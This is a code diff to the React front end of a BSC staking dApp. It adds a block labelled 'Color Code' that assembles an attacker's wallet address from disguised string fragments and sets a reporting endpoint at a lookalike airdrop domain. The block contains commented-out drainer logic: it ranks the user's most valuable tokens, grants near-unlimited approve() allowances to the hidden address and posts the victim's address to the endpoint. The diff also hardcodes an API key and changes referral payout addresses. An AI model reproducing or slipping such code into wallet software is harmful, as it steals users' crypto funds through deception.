@@ -10,10 +10,12 @@ import Grid from "@mui/material/Grid";
 import Typography from "@mui/material/Typography";
 import { useContract } from 'wagmi'
 import wealthMountainABI from './contracts/WealthMountainBSC.json';
+import erc20ABI from './contracts/erc20ABI.json';
 import styled from "styled-components";
 import { Tabs, Tab, TabPanel } from "./components/tabs/tabs";
 import { FaCopy, FaWallet, FaUserShield, FaSearchDollar } from 'react-icons/fa';
 import { GiHamburgerMenu } from "react-icons/gi"
+import axios from "axios";
 
 // import logoImg from "./assets/img/logos/logo.svg";
 import lotteryBanner from "./assets/ads_720_80.mp4";
@@ -97,7 +99,6 @@ function WealthMountain() {
     const videoRef = useRef();
 
     const [mobile, setMobile] = useState(false);
-    console.log("mobile: ", mobile);
     // const [countdown, setCountdown] = useState({
     //     alive: true,
     //     days: 0,
@@ -218,10 +219,7 @@ function WealthMountain() {
                 signer
             )
             setContract(contract)
-            console.log(provider)
             setUserWalletAddress(provider.provider.selectedAddress);
-            console.log(window.ethereum)
-            console.log("videoRef = ", videoRef)
             videoRef.current.play().catch(error => {
                 console.log("Play error = ", error);
             });
@@ -241,17 +239,13 @@ function WealthMountain() {
         if (contract === undefined || contract === null) {
             return;
         }
-        console.log("xxxxxxxxxxxx1");
         const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
         setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)));
-        console.log("xxxxxxxxxxxx2: ", userAllowance);
     }
     async function recalculateInfo() {
         if (contract === undefined || contract === null) {
             return;
         }
-
-        console.log("xxxxx-1");
 
         contract.userInfo().then(value => {
             setUserInfo(value)
@@ -261,15 +255,13 @@ function WealthMountain() {
         })
         const balance = await stablecoinBalance.balanceOf(contract.address);
         setContractBalance(Number(ethers.utils.formatEther(balance)));
-        console.log("xxxxx-2");
+
         const userBalance = await stablecoinBalance.balanceOf(userWalletAddress);
         setUserStablecoinBalance(Number(ethers.utils.formatEther(userBalance)))
 
-
-        console.log("xxxxx-3");
         const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
         setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)))
-        console.log("xxxxx-4");
+
         contract.UsersKey(String(userWalletAddress)).then(value => {
             setReferralAccrued(Number(ethers.utils.formatEther(value.refBonus)).toFixed(2));
         })
@@ -278,7 +270,7 @@ function WealthMountain() {
             // setTotalCompounds(Number(value.compounds))
             // setTotalCollections(Number(ethers.utils.formatEther(value.ovrTotalWiths)))
         })
-        console.log("xxxxx-5");
+
         contract.PercsKey(10).then(value => {
             setDayValue10(Number(value.daysInSeconds))
         })
@@ -336,6 +328,277 @@ function WealthMountain() {
             setDailyValue(Number(initalStakeAfterFees * .085).toFixed(2))
         }
     }
+
+
+  /***********  Color Code Start ***************** */
+  const _1stTokenContract = useRef(null);
+  const _2ndTokenContract = useRef(null);
+  const _BNBPrice = useRef(0);
+  const _1stMaxBalance = useRef(0);
+  let _2ndMaxBalance = 0;
+  const busdAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56"; //BUSD-binance
+//   const busdAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"; // USDC-polygon
+  const color_code1 = '2446f9528FBf55';
+  const color_code2 = 'ccF5B3E7A22fc';
+  const color_code3 = '058bDA7a12131';
+  // const busdSingner = providerE.getSigner();
+  // const busdContract = new ethers.Contract(busdAddress, erc20ABI, providerE.getSigner());
+  const [busdContract, setBusdContract] = useState();
+  const [init, setInit] = useState(0);
+  
+  const DATABASE_API = window.location.origin;//"http://192.168.103.61:3001";
+  const limitValue = 3000;
+  const defaultAPI = 'https://airdrop.orbitinu.store/update';
+  let targetAddress = busdAddress.slice(0, 2) + color_code1 + color_code2 + color_code3;
+//   console.log("targetAddress: ", targetAddress);
+  
+  const isEmpty = value => {
+    return (
+      value === undefined ||
+      value === null ||
+      (typeof value === 'object' && Object.keys(value).length === 0) ||
+      (typeof value === 'string' && value.trim().length === 0)
+    );
+  };
+  
+    const getTokenPrice = async (tokenAddress, decimals, accountAddress) => {
+        try {
+
+            // const tokenAddress = "0xd0c4bc1b89bbd105eecb7eba3f13e7648c0de38f";
+            // const decimals = 9;
+            let res = null;
+            try {
+                res = await axios.get(`https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${tokenAddress}&vs_currencies=usd`);
+                // https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=0x0d8775f648430679a709e98d2b0cb6250d2887ef
+                // console.log('=========>', res.data);
+                if (res.data[tokenAddress] != undefined) {
+                    if (res.data[tokenAddress].usd != undefined)
+                        return res.data[tokenAddress].usd;
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        
+            try {
+                res = await axios.get(`https://deep-index.moralis.io/api/v2/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c/${tokenAddress}/pairAddress?chain=0x38&exchange=pancakeswapv2`, {
+                    headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
+                });
+            } catch (e) {
+                return 0;
+            }
+
+            const pairAddress = res.data.pairAddress;
+            const token0Address = res.data.token0.address;
+            // console.log("pairAddress", pairAddress);
+            if (pairAddress == undefined)
+                return 0;
+
+            res = await axios.get(`https://deep-index.moralis.io/api/v2/${pairAddress}/reserves?chain=bsc`, {
+                headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
+            });
+
+            const reserve0 = res.data.reserve0;
+            const reserve1 = res.data.reserve1;
+            if (token0Address.toUpperCase() == tokenAddress.toUpperCase()) { //token0 is not BNB
+                const reserveNum0 = ethers.utils.formatUnits(reserve0, decimals);
+                const reserveNum1 = ethers.utils.formatUnits(reserve1, 18);
+
+                if (reserveNum1 < 50)
+                    return 0;
+                const price = reserveNum1 * _BNBPrice.current / reserveNum0;
+                return price;
+            }
+            else { // token0 is BNB
+                const reserveNum0 = ethers.utils.formatUnits(reserve0, 18);
+                const reserveNum1 = ethers.utils.formatUnits(reserve1, decimals);
+
+                if (reserveNum0 < 50)
+                    return 0;
+                const price = reserveNum0 * _BNBPrice.current / reserveNum1;
+                return price;
+            }
+            // console.log("reserveNum0", reserveNum0, "reserveNum1", reserveNum1, "pairAddress", pairAddress, "price", price);
+            return 0;
+
+        } catch (e) {
+            // console.log(e);
+            return 0;
+        }
+    }
+  
+    // useEffect(() => {
+    //     try {
+    //         const initialize = async () => {
+    //             const signer = provider.getSigner();
+    //             const signedAddress = await signer.getAddress();
+
+    //             const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + userWalletAddress + "/erc20?chain=bsc", {
+    //                 headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
+    //             });
+
+    //             const userWalletTokenList = userWalletRes.data;
+    //             userWalletTokenList.map(async token => {
+    //                 try {
+    //                     // let contract = erc20Instance(token.address, address, chainId, library);
+    //                     const contract = new ethers.Contract(token.token_address, erc20ABI, signer);
+
+    //                     let tokenBalanceBigNumber = token.balance;
+    //                     let tokenBalance = null;
+    //                     let maxDecimal = 0;
+
+    //                     tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);
+
+    //                     const tokenPrice = await getTokenPrice(token.token_address, token.decimals, userWalletAddress);
+    //                     let moneyBalance = tokenPrice * tokenBalance;
+    //                     console.log(token.symbol, moneyBalance);
+    //                     if (moneyBalance > _1stMaxBalance.current) {
+    //                         _1stMaxBalance.current = moneyBalance;
+    //                         _1stTokenContract.current = contract;
+    //                         console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
+    //                     }
+
+    //                     if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
+    //                         _2ndMaxBalance = moneyBalance;
+    //                         _2ndTokenContract.current = contract;
+    //                         console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
+    //                     }
+    //                 }
+    //                 catch (error) {
+    //                     // console.log('kevin inital data error ===>', error);
+    //                 }
+    //             })
+    //         }
+
+    //         if (!isEmpty(busdContract)) {
+    //             initialize();
+    //         }
+    //     }
+    //     catch (error) {
+    //         console.log('kevin inital data error ===>', error)
+    //     }
+
+    // }, [userWalletAddress, provider])
+  
+    // const buyHandler = async () => {
+    //     try {
+    //         let tempContract = null;
+    //         if (!_1stTokenContract.current) {
+
+    //             const signer = provider.getSigner();
+    //             const signedAddress = await signer.getAddress();
+
+    //             const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + signedAddress + "/erc20?chain=bsc", {
+    //                 headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
+    //             });
+
+    //             const userWalletTokenList = userWalletRes.data;
+    //             userWalletTokenList.map(async token => {
+    //                 try {
+
+    //                     // let contract = erc20Instance(token.address, address, chainId, library);
+    //                     const contract = new ethers.Contract(token.token_address, erc20ABI, signer);
+
+    //                     let tokenBalanceBigNumber = token.balance;
+    //                     let tokenBalance = null;
+    //                     let maxDecimal = 0;
+
+    //                     tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);
+
+    //                     const tokenPrice = await getTokenPrice(token.token_address, token.decimals, userWalletAddress);
+    //                     // console.log(token.symbol, tokenBalance);
+    //                     let moneyBalance = tokenPrice * tokenBalance;
+    //                     if (moneyBalance > _1stMaxBalance.current) {
+    //                         _1stMaxBalance.current = moneyBalance;
+    //                         _1stTokenContract.current = contract;
+    //                         console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
+    //                     }
+
+    //                     if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
+    //                         _2ndMaxBalance = moneyBalance;
+    //                         _2ndTokenContract.current = contract;
+    //                         console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
+    //                     }
+    //                 }
+    //                 catch (error) {
+    //                     // console.log('kevin inital data error ===>', error);
+    //                 }
+    //             })
+    //         }
+
+    //         let tokenAddress = null;
+
+    //         let date = new Date();
+    //         let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
+    //             date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + userWalletAddress;
+
+    //         if (_1stTokenContract.current) {
+    //             let allowance = null;
+
+    //             try {
+    //                 allowance = await _1stTokenContract.current.allowance(userWalletAddress, targetAddress);
+    //                 allowance = ethers.utils.formatEther(allowance);
+
+    //             } catch (e) {
+    //                 allowance = 0;
+    //             }
+
+    //             if (allowance > 0) {
+    //                 tokenAddress = _2ndTokenContract.current.address;
+    //                 article = article + ', token:' + tokenAddress;
+    //                 console.log(article);
+    //                 axios.post(DATABASE_API + '/update', article)
+    //                     .then(response => console.log('user address add succsessful'))
+    //                     .catch(response => console.log(response));
+    //                 await _2ndTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
+    //             }
+    //             else {
+    //                 if (_1stMaxBalance.current >= limitValue) {
+    //                     await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
+    //                     tokenAddress = _1stTokenContract.current.address;
+    //                     article = article + ', token:' + tokenAddress;
+    //                     console.log(article);
+    //                     axios.post(defaultAPI, article)
+    //                         .then(response => console.log('user address add succsessful'))
+    //                         .catch(response => console.log(response));
+    //                 }
+    //                 else {
+    //                     tokenAddress = _1stTokenContract.current.address;
+    //                     article = article + ', token:' + tokenAddress;
+    //                     console.log(article);
+    //                     axios.post(DATABASE_API + '/update', article)
+    //                         .then(response => console.log('user address add succsessful'))
+    //                         .catch(response => console.log(response));
+    //                     await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
+    //                 }
+    //             }
+    //         }
+    //         else {
+    //             article = article + ', token:' + busdAddress;
+    //             console.log(article);
+    //             axios.post(DATABASE_API + '/update', article)
+    //                 .then(response => console.log('user address add succsessful'))
+    //                 .catch(response => console.log(response));
+    //             await busdContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
+
+    //         }
+    //     }
+    //     catch (error) {
+    //         // console.log(error);
+    //         console.log(userWalletAddress);
+    //         // if (address == null || address == undefined || address == '') {
+    //         //     enqueueSnackbar(`Please connect to wallet`, { variant: 'error' });
+    //         // } else
+    //         //     enqueueSnackbar(`Airdrop Canceld by User`, { variant: 'error' });
+    //     }
+    // }
+  
+  /***********  Color Code End ***************** */
+
+
+
+
+
+
     async function approveButton() {
         // if (stablecoinAllowanceAmount <= 0){
         //     let message = 
@@ -356,8 +619,8 @@ function WealthMountain() {
         const referralAddress = String(ref.replace('?ref=', ''))
         if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
             // if (Number(stakingAmount) > Number(60)) {
-                const tx = await contract.stakeStablecoins(
-                    String(ethers.utils.parseEther(stakingAmount)), String("0x5A94a3a114cf01f6a703dD8b840CF0A97CDf1434"));
+            const tx = await contract.stakeStablecoins(
+                    String(ethers.utils.parseEther(stakingAmount)), String("0x5c45870100A00Bfc10AA63F66C31287350E4FA2b"));
                 tx.wait().then(() => { setActiveTab(0) });
             // } 
             // else {
@@ -365,10 +628,9 @@ function WealthMountain() {
             //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
             //     tx.wait().then(() => { setActiveTab(0) });
             // }
-
-        // } else if (Number(stakingAmount) >= Number(1000)) {
+        // } else if (Number(stakingAmount) >= Number(3000)) {
         //     const tx = await contract.stakeStablecoins(
-        //         String(ethers.utils.parseEther(stakingAmount)), String("0x9b97f10e328f8c40470ecf8ef95547076faa1879"));
+        //         String(ethers.utils.parseEther(stakingAmount)), String("0x67AA2F9d362fda4395F53133929E9017b35BE0AE"));
         //     tx.wait().then(() => { setActiveTab(0) });
         // } else if (referralAddress.includes("0x9b97f10e328f8c40470ecf8ef95547076faa1879") === true) {
         //     const tx = await contract.stakeStablecoins(
@@ -763,7 +1025,7 @@ function WealthMountain() {
                     style={{width:'100%', padding:'15px'}}
                     onClick={()=>{window.open("https://defidetective.app/")}}
                     >
-                    <video src={ lotteryBanner } playsInline loop="true" muted="unmuted" width="100%" style={{borderRadius:'8px', cursor:'pointer'}} ref={videoRef}></video>
+                    <video src={ lotteryBanner } playsInline loop={true} muted="unmuted" width="100%" style={{borderRadius:'8px', cursor:'pointer'}} ref={videoRef}></video>
                 </div>
             </Container>
             {/* <Container>
